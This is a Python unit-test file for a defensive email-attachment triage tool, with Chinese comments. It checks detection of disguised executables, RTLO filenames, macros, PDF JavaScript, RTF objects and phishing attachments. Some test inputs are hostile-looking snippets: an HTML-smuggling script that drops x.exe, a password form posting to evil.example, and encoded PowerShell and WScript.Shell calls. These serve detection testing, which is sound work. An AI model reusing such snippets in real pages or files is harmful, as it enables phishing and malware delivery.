"""离线单元测试：不联网，所有样本由 samples/make_samples.py 现场生成（全部无害）。
运行: python3 -m unittest -v
"""
import io
import json
import os
import shutil
import sys
import tempfile
import unittest
import urllib.error
import zipfile
from contextlib import redirect_stdout, redirect_stderr
from unittest import mock

import triage as t

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "samples"))
import make_samples as ms  # noqa: E402

HAVE_OLETOOLS = t.olevba is not None
SAMPLES = ms.all_samples()


def cats(report, severity=None):
    return [(f.severity, f.category, f.message) for f in report.findings
            if severity is None or f.severity == severity]


def has(report, severity, text):
    return any(f.severity == severity and text in f.message for f in report.findings)


class TestDetectType(unittest.TestCase):
    def test_magic_bytes(self):
        cases = {
            b"\x7fELF\x02\x01": "elf",
            b"\xcf\xfa\xed\xfe....": "macho",
            b"%PDF-1.4\n...": "pdf",
            b"{\\rtf1\\ansi}": "rtf",
            b"Rar!\x1a\x07\x00": "rar",
            b"7z\xbc\xaf\x27\x1c\x00": "7z",
            b"\x1f\x8b\x08\x00": "gzip",
            b"MSCF\0\0\0\0": "cab",
            b"\x89PNG\r\n\x1a\n....": "png",
            b"\xff\xd8\xff\xe0..JFIF": "jpeg",
            b"GIF89a....": "gif",
            b"L\0\0\0\x01\x14\x02\0\0\0\0\0\xc0\0\0\0\0\0\0F....": "lnk",
            b"ID;PWXL;N;E\r\n": "slk",
            b"<!DOCTYPE html><html></html>": "html",
            b"hello world\n": "text",
            b"\x00\x01\x02\x03\x04": "unknown",
        }
        for data, expected in cases.items():
            with self.subTest(expected=expected):
                self.assertEqual(t.detect_type(data), expected)

    def test_pe_and_iso(self):
        self.assertEqual(t.detect_type(ms.fake_pe()), "pe")
        self.assertTrue(t._is_pe(ms.fake_pe()))
        self.assertFalse(t._is_pe(b"MZ" + b"\0" * 100))
        iso = bytearray(0x9000)
        iso[0x8001:0x8006] = b"CD001"
        self.assertEqual(t.detect_type(bytes(iso)), "iso")

    def test_zip_subtypes(self):
        self.assertEqual(t.detect_type(SAMPLES["macro_demo.docm"]), "docx")
        self.assertEqual(t.detect_type(SAMPLES["archive.zip"]), "zip")
        self.assertEqual(t.detect_type(zip_of({"[Content_Types].xml": "x", "xl/workbook.xml": "x"})), "xlsx")
        self.assertEqual(t.detect_type(zip_of({"[Content_Types].xml": "x", "ppt/p.xml": "x"})), "pptx")
        self.assertEqual(t.detect_type(zip_of({"META-INF/MANIFEST.MF": "x"})), "jar")
        self.assertEqual(t.detect_type(zip_of({"mimetype": "application/vnd.oasis.opendocument.text"})), "odf")

    @unittest.skipUnless(HAVE_OLETOOLS, "需要 olefile")
    def test_ole_subtype(self):
        self.assertEqual(t.detect_type(ms.build_cfb({"WordDocument": b"x" * 10})), "ole-doc")
        self.assertEqual(t.detect_type(ms.build_cfb({"Workbook": b"x" * 5000})), "ole-xls")
        self.assertEqual(t.detect_type(ms.build_cfb({"EncryptionInfo": b"x", "EncryptedPackage": b"y"})),
                         "ole-encrypted")
        self.assertEqual(t.detect_type(ms.build_cfb({"Foo": b"x"})), "ole")

    def test_email_and_script_text(self):
        self.assertEqual(t.detect_type(SAMPLES["phish.eml"]), "eml")
        self.assertEqual(t.detect_type(b'Set sh = CreateObject("WScript.Shell")\nsh.Run "x"\n'), "script")
        self.assertEqual(t.detect_script("powershell -EncodedCommand AAAA"), "ps1")
        self.assertEqual(t.detect_script("@echo off\r\ndel x"), "bat")
        self.assertEqual(t.detect_script("var x = new ActiveXObject('a')"), "js")
        self.assertIsNone(t.detect_script("just a note"))


def zip_of(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for n, d in files.items():
            z.writestr(n, d)
    return buf.getvalue()


class TestNameChecks(unittest.TestCase):
    def report(self, name, data=b"hello\n"):
        return t.analyze_bytes(name, data)

    def test_double_extension(self):
        r = self.report("invoice.pdf.exe", ms.fake_pe())
        self.assertTrue(has(r, t.HIGH, "双扩展名"))
        self.assertEqual(r.extension, "exe")

    def test_rtlo(self):
        r = self.report("photo_‮gpj.exe", ms.fake_pe())
        self.assertTrue(has(r, t.HIGH, "U+202E"))
        self.assertEqual(r.extension, "exe")
        self.assertEqual(t.safe_name("a‮b"), "a<U+202E>b")

    def test_padding(self):
        r = self.report("invoice.pdf" + " " * 20 + ".scr", ms.fake_pe())
        self.assertTrue(has(r, t.MEDIUM, "填充字符"))

    def test_extension_classes(self):
        self.assertTrue(has(self.report("a.hta"), t.HIGH, ".hta"))
        self.assertTrue(has(self.report("a.iso"), t.MEDIUM, "Mark-of-the-Web"))
        self.assertTrue(has(self.report("a.xlsm", zip_of({"x": "y"})), t.MEDIUM, "允许宏"))
        self.assertEqual(cats(self.report("notes.txt")), [])


class TestTypeVsExtension(unittest.TestCase):
    def test_pe_as_jpg_is_high(self):
        r = t.analyze_bytes("photo.jpg", ms.fake_pe())
        self.assertTrue(has(r, t.HIGH, "内容其实是 Windows 可执行文件"))
        self.assertEqual(r.severity, t.HIGH)

    def test_rtf_as_doc_is_medium(self):
        r = t.analyze_bytes("report.doc", SAMPLES["report.doc"])
        self.assertTrue(has(r, t.MEDIUM, "RTF"))
        self.assertIn("CVE-2017-11882", r.findings[0].detail)

    def test_docx_as_doc_is_low(self):
        r = t.analyze_bytes("letter.doc", SAMPLES["template.docx"])
        self.assertTrue(has(r, t.LOW, "Word 文档 (OOXML)"))

    def test_text_rules(self):
        self.assertFalse(any(f.category == "伪装" for f in t.analyze_bytes("x.js", b"// hi\n").findings))
        self.assertTrue(has(t.analyze_bytes("x.pdf", b"plain text\n"), t.LOW, "纯文本"))
        r = t.analyze_bytes("notes.txt", b'Dim a\nSet o = CreateObject("WScript.Shell")\n')
        self.assertTrue(has(r, t.MEDIUM, "vbs 脚本"))

    def test_matching_extension_is_clean(self):
        self.assertEqual(cats(t.analyze_bytes("pic.png", b"\x89PNG\r\n\x1a\n" + b"\0" * 20)), [])


class TestCfbWriter(unittest.TestCase):
    @unittest.skipUnless(HAVE_OLETOOLS, "需要 olefile")
    def test_roundtrip_small_and_big_streams(self):
        big = bytes(range(256)) * 40  # 10 KB，走普通扇区
        data = ms.build_cfb({"A/small": b"hello", "A/big": big, "B": b"x" * 100})
        ole = t.olefile.OleFileIO(io.BytesIO(data))
        self.assertEqual(ole.openstream("A/small").read(), b"hello")
        self.assertEqual(ole.openstream("A/big").read(), big)
        self.assertEqual(ole.openstream("B").read(), b"x" * 100)

    def test_ovba_compress_roundtrip(self):
        if not HAVE_OLETOOLS:
            self.skipTest("需要 oletools")
        src = ("Sub X()\r\n" * 900).encode()  # 超过一个 chunk
        self.assertEqual(bytes(t.olevba.decompress_stream(bytearray(ms.ovba_compress(src)))), src)


@unittest.skipUnless(HAVE_OLETOOLS, "需要 oletools")
class TestMacros(unittest.TestCase):
    def test_docm_macro_extracted_and_flagged(self):
        r = t.analyze_bytes("macro_demo.docm", SAMPLES["macro_demo.docm"])
        self.assertEqual(len(r.macros), 1)
        self.assertIn('MsgBox "attachment-triage demo macro"', r.macros[0]["code"])
        self.assertTrue(has(r, t.HIGH, "自动执行"))
        self.assertTrue(has(r, t.HIGH, "CreateObject"))
        self.assertTrue(any("example.invalid" in f.message for f in r.findings if f.category == "宏"))

    def test_extract_dir(self):
        d = tempfile.mkdtemp()
        try:
            r = t.analyze_bytes("m.docm", SAMPLES["macro_demo.docm"], t.Options(extract_dir=d))
            saved = r.macros[0]["saved_to"]
            self.assertTrue(saved.startswith(d))
            with open(saved, encoding="utf-8") as f:
                self.assertIn("AutoOpen", f.read())
        finally:
            shutil.rmtree(d)

    def test_clean_docx_has_no_macro_findings(self):
        docx = zip_of({"[Content_Types].xml": "<Types/>", "word/document.xml": ms._DOC})
        r = t.analyze_bytes("clean.docx", docx)
        self.assertEqual(r.macros, [])
        self.assertEqual(cats(r), [])

    def test_vba_inside_docx_extension(self):
        r = t.analyze_bytes("innocent.docx", SAMPLES["macro_demo.docm"])
        self.assertTrue(has(r, t.MEDIUM, "vbaProject.bin"))

    def test_encrypted_with_default_password(self):
        plain = SAMPLES["macro_demo.docm"]
        fake = mock.Mock()
        fake.is_encrypted.return_value = True

        def decrypt(path):
            out = path + ".dec"
            with open(out, "wb") as f:
                f.write(plain)
            return out
        fake.decrypt.side_effect = decrypt
        enc = ms.build_cfb({"EncryptionInfo": b"x", "EncryptedPackage": b"y"})
        with mock.patch.object(t, "olecrypto", fake):
            r = t.analyze_bytes("locked.docm", enc)
        self.assertTrue(has(r, t.MEDIUM, "默认密码就能解开"))
        self.assertEqual(r.children[0].source, "默认密码解密后")
        self.assertEqual(r.severity, t.HIGH)  # 解密后的宏把整体拉到高危

    def test_encrypted_without_password(self):
        fake = mock.Mock()
        fake.is_encrypted.return_value = True
        fake.decrypt.return_value = None
        enc = ms.build_cfb({"EncryptionInfo": b"x", "EncryptedPackage": b"y"})
        with mock.patch.object(t, "olecrypto", fake):
            r = t.analyze_bytes("locked.docx", enc)
        self.assertTrue(has(r, t.MEDIUM, "没有密码"))
        self.assertEqual(r.children, [])


class TestWithoutOletools(unittest.TestCase):
    def test_degrades_gracefully(self):
        with mock.patch.object(t, "olevba", None):
            r = t.analyze_bytes("m.docm", SAMPLES["macro_demo.docm"])
        self.assertTrue(has(r, t.INFO, "没装 oletools"))
        self.assertTrue(r.sha256)


class TestContentChecks(unittest.TestCase):
    def test_remote_template(self):
        r = t.analyze_bytes("template.docx", SAMPLES["template.docx"])
        self.assertTrue(has(r, t.HIGH, "attachedTemplate"))
        self.assertTrue(has(r, t.HIGH, "example.invalid/template.dotm"))

    def test_xlm_macrosheet(self):
        x = zip_of({"[Content_Types].xml": "x",
                    "xl/workbook.xml": '<definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName>',
                    "xl/macrosheets/sheet1.xml": "<xm/>"})
        r = t.analyze_bytes("book.xlsx", x)
        self.assertTrue(has(r, t.HIGH, "Auto_Open"))

    def test_pdf_js_and_obfuscation(self):
        r = t.analyze_bytes("scan.pdf", SAMPLES["scan.pdf"])
        self.assertTrue(has(r, t.HIGH, "JavaScript"))
        self.assertTrue(has(r, t.HIGH, "#xx"))
        self.assertTrue(has(r, t.MEDIUM, "OpenAction"))
        self.assertEqual(sum("JavaScript" in f.message for f in r.findings), 1)  # /JS 不重复报

    def test_clean_pdf(self):
        pdf = b"%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n%%EOF"
        self.assertEqual(cats(t.analyze_bytes("ok.pdf", pdf)), [])

    def test_pdf_normalize(self):
        self.assertEqual(t._pdf_normalize(b"/Java#53cript /O#70enAction"), b"/JavaScript /OpenAction")

    def test_rtf_object(self):
        r = t.analyze_bytes("a.rtf", b"{\\rtf1{\\object\\objemb{\\*\\objclass Equation.3}{\\*\\objdata 0105}}}")
        self.assertTrue(has(r, t.HIGH, "OLE 对象"))
        # 被转义的 \\object 只是普通文字（比如 RTF 规范文档本身），不算
        self.assertEqual(cats(t.analyze_bytes("spec.rtf", b"{\\rtf1 use \\\\objdata to embed}")), [])

    def test_html_smuggling_and_phishing(self):
        smug = b"<html><script>var b=new Blob([atob('TVo=')]);a.href=URL.createObjectURL(b);a.download='x.exe'</script>"
        self.assertTrue(has(t.analyze_bytes("a.html", smug), t.HIGH, "HTML 走私"))
        form = b'<html><form action="https://evil.example/p"><input type="password"></form></html>'
        self.assertTrue(has(t.analyze_bytes("login.htm", form), t.HIGH, "密码表单"))


class TestContainers(unittest.TestCase):
    def test_zip_members_are_analyzed(self):
        r = t.analyze_bytes("archive.zip", SAMPLES["archive.zip"])
        names = [c.name for c in r.children]
        self.assertEqual(names, ["readme.txt", "invoice.js"])
        self.assertEqual(r.children[1].severity, t.HIGH)
        self.assertEqual(r.severity, t.HIGH)

    def test_encrypted_zip_member(self):
        data = bytearray(zip_of({"invoice.pdf.exe": "x"}))
        # 手工把 "已加密" 标志位置上（本地头 offset 6，中央目录 offset 8）
        data[6] |= 1
        cd = data.find(b"PK\x01\x02")
        data[cd + 8] |= 1
        r = t.analyze_bytes("docs.zip", bytes(data))
        self.assertTrue(has(r, t.MEDIUM, "密码保护"))
        self.assertTrue(has(r.children[0], t.HIGH, "双扩展名"))  # 不解包也能看名字
        self.assertIn("未解包", r.children[0].source)

    def test_nesting_depth_is_limited(self):
        data = b"hello"
        for i in range(6):
            data = zip_of({"layer%d.zip" % i: data})
        r = t.analyze_bytes("deep.zip", data)
        depth = 0
        node = r
        while node.children:
            node = node.children[0]
            depth += 1
        self.assertLessEqual(depth, t.MAX_DEPTH + 1)

    def test_eml_attachments(self):
        r = t.analyze_bytes("phish.eml", SAMPLES["phish.eml"])
        self.assertEqual(r.file_type, "eml")
        self.assertIn("Overdue invoice", r.type_desc)
        self.assertEqual(len(r.children), 3)
        exe = r.children[0]
        self.assertEqual(exe.source, "邮件附件")
        self.assertTrue(has(exe, t.HIGH, "U+202E"))
        self.assertEqual(r.children[2].file_type, "pdf")
        self.assertEqual(r.severity, t.HIGH)

    def test_eml_without_attachments(self):
        r = t.analyze_bytes("a.eml", b"From: a@x\nTo: b@x\nSubject: hi\nDate: x\n\nbody\n")
        self.assertTrue(has(r, t.INFO, "没有附件"))


class FakeResp(io.BytesIO):
    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def vt_body(mal, sus=0, und=60, label=""):
    return json.dumps({"data": {"id": "ab" * 32, "attributes": {
        "last_analysis_stats": {"malicious": mal, "suspicious": sus, "undetected": und, "harmless": 0},
        "popular_threat_classification": {"suggested_threat_label": label},
        "names": ["a.exe"], "type_description": "Win32 EXE"}}}).encode()


def http_error(code):
    return urllib.error.HTTPError("u", code, "x", {}, io.BytesIO(b""))


class TestVirusTotal(unittest.TestCase):
    def setUp(self):
        self.vt = t.VirusTotal("KEY", delay=0)

    def test_found_malicious(self):
        with mock.patch("urllib.request.urlopen", return_value=FakeResp(vt_body(40, label="trojan.emotet"))) as m:
            r = t.analyze_bytes("a.exe", ms.fake_pe(), t.Options(vt=self.vt))
        req = m.call_args[0][0]
        self.assertEqual(req.get_header("X-apikey"), "KEY")
        self.assertTrue(req.full_url.endswith(r.sha256))  # 只发哈希
        self.assertTrue(has(r, t.HIGH, "40/100 个引擎报毒"))
        self.assertTrue(has(r, t.HIGH, "trojan.emotet"))

    def test_low_detection_and_clean(self):
        tmp = t.Report("x", 1, "unknown", "", "")
        t.apply_vt(tmp, t.parse_vt(json.loads(vt_body(1))))
        self.assertEqual(tmp.findings[0].severity, t.MEDIUM)
        tmp = t.Report("x", 1, "unknown", "", "")
        t.apply_vt(tmp, t.parse_vt(json.loads(vt_body(0))))
        self.assertEqual(tmp.findings[0].severity, t.INFO)

    def test_not_found_and_cache(self):
        with mock.patch("urllib.request.urlopen", side_effect=http_error(404)) as m:
            self.assertEqual(self.vt.lookup("AB" * 32)["status"], "not_found")
            self.vt.lookup("ab" * 32)
        self.assertEqual(m.call_count, 1)

    def test_bad_key_stops_further_lookups(self):
        with mock.patch("urllib.request.urlopen", side_effect=http_error(401)) as m:
            self.assertEqual(self.vt.lookup("aa" * 32)["status"], "error")
            self.assertEqual(self.vt.lookup("bb" * 32)["status"], "skipped")
        self.assertEqual(m.call_count, 1)

    def test_rate_limit_delay(self):
        vt = t.VirusTotal("KEY", delay=15)
        with mock.patch("urllib.request.urlopen", side_effect=lambda *a, **k: FakeResp(vt_body(0))), \
                mock.patch("time.sleep") as sleep:
            vt.lookup("aa" * 32)
            vt.lookup("bb" * 32)
        self.assertEqual(sleep.call_count, 1)
        self.assertGreater(sleep.call_args[0][0], 10)

    def test_eml_itself_not_looked_up(self):
        with mock.patch("urllib.request.urlopen", side_effect=http_error(404)) as m:
            t.analyze_bytes("phish.eml", SAMPLES["phish.eml"], t.Options(vt=self.vt))
        # 3 个附件，其中两个哈希不同于邮件本身；邮件本身不查
        self.assertEqual(m.call_count, 3)
        with mock.patch("urllib.request.urlopen", side_effect=http_error(404)) as m:
            t.analyze_bytes("phish.eml", SAMPLES["phish.eml"],
                            t.Options(vt=t.VirusTotal("K", delay=0), vt_children=False))
        self.assertEqual(m.call_count, 0)


class TestCli(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.dir = tempfile.mkdtemp()
        with redirect_stdout(io.StringIO()):
            ms.main([cls.dir])

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.dir)

    def run_cli(self, *args, env=None):
        out = io.StringIO()
        with redirect_stdout(out), redirect_stderr(io.StringIO()), mock.patch.dict(os.environ, env or {}, clear=False):
            try:
                code = t.main(list(args))
            except SystemExit as e:
                code = e.code
        return code, out.getvalue()

    def test_text_output_on_sample_dir(self):
        code, out = self.run_cli(self.dir)
        self.assertEqual(code, 1)
        self.assertIn("invoice.pdf.exe", out)
        self.assertIn("<U+202E>", out)  # RTLO 被显示出来，而不是真的反转
        self.assertIn("最高风险：🔴 高危", out)

    def test_json_output(self):
        code, out = self.run_cli(os.path.join(self.dir, "phish.eml"), "--json")
        data = json.loads(out)
        top = data["files"][0]
        self.assertEqual(top["severity"], "high")
        self.assertEqual(len(top["children"]), 3)

    def test_clean_file_exit_0(self):
        p = os.path.join(self.dir, "..", "clean-%d.txt" % os.getpid())
        with open(p, "w") as f:
            f.write("hello\n")
        try:
            self.assertEqual(self.run_cli(p)[0], 0)
        finally:
            os.remove(p)

    def test_missing_file_exit_2(self):
        code, out = self.run_cli(os.path.join(self.dir, "nope.bin"))
        self.assertEqual(code, 2)

    def test_needs_input(self):
        self.assertEqual(self.run_cli()[0], 2)

    def test_vt_needs_key(self):
        with mock.patch.dict(os.environ, {"VT_API_KEY": ""}):
            self.assertEqual(self.run_cli(self.dir, "--vt")[0], 2)

    def test_hash_lookup(self):
        with mock.patch("urllib.request.urlopen", return_value=FakeResp(vt_body(12))):
            code, out = self.run_cli("--hash", "ab" * 32, env={"VT_API_KEY": "K"})
        self.assertEqual(code, 1)
        self.assertIn("12/72 个引擎报毒", out)
        code, out = self.run_cli("--hash", "nothex", env={"VT_API_KEY": "K"})
        self.assertEqual(code, 2)


if __name__ == "__main__":
    unittest.main()
